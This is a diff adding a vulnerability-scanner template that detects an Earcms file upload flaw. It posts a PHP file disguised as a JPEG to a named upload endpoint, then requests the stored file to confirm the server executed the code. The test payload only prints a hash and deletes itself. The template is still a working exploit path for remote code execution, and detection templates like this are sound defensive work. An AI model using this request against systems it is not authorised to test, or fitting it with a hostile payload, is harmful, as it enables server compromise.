@@ -1,0 +1,59 @@
+id: earcms-file-upload
+info:
+  name: Earcms File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Earcms that allows arbitrary PHP code execution.
+
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  r2: '{{rand_int(44801, 84800)}}'
+  r3: '{{md5(to_string(r2))}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+  randname: '{{rand_text_alpha(6)}}'
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/source/pack/upload/index-uplog.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+
+      Content-Disposition: form-data; name="time"
+
+      {{r3}}
+
+      ------WebKitFormBoundary{{rboundary}}
+
+      Content-Disposition: form-data; name="app"; filename="{{randname}}.php"
+
+      Content-Type: image/jpeg
+
+      <?php echo md5({{r1}});unlink(__FILE__);?>
+
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "php"
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/data/tmp/{{r3}}.php"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(to_string(r1))}}"
